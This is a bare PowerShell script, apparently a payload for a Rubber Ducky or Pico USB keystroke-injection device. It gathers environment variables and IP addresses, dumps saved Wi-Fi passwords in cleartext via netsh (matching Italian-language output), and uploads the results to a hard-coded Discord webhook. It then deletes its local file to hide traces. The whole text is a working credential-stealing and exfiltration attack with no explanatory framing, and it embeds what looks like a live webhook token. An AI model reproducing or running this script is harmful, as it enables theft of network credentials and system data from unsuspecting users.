$url="https://discord.com/api/webhooks/1227536936122716212/eVwKMbzHaZ-xBxclEiUJkMQ6Zo3QlPxn1RCbOVwMhFZOx70lXLTvAls6fwQJhWWmrzpH"; dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt; (netsh wlan show profiles) | Select-String "Tutti i profili utente" | ForEach-Object { $profileName = $_.ToString().Split(":")[1].Trim(); $profileInfo = (netsh wlan show profile name="$profileName" key=clear) | Select-String "Contenuto chiave"; $password = $profileInfo -replace "    Contenuto chiave            : ", ""; [PSCustomObject]@{ PROFILE_NAME = $profileName; PASSWORD = $password } } | Format-Table -AutoSize >> stats.txt; $Body=@{ content = "$env:computername Stats from Ducky/Pico"}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt'; exit